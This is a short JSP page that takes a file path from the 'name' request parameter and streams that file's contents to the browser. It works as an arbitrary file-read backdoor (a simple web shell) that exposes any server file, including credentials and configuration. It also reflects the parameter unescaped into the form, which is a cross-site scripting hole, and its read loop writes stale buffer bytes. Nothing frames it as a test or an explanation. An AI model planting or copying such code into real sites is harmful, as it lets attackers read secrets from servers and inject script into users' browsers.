<%@ page import="java.io.*" %>
<%
	String name = request.getParameter("name");
	if (name != null && name != "") {
		InputStream is = new FileInputStream(new File(name));
		byte[] buf = new byte[10240];
		while (is.read(buf) >= 0) {
			out.write(buf);
		}
	} else {
%>
<form>
	Name: <input name="name" size="100" value="<%= name %>" />
	<input type="submit" />
</form>
<%
	}
%>
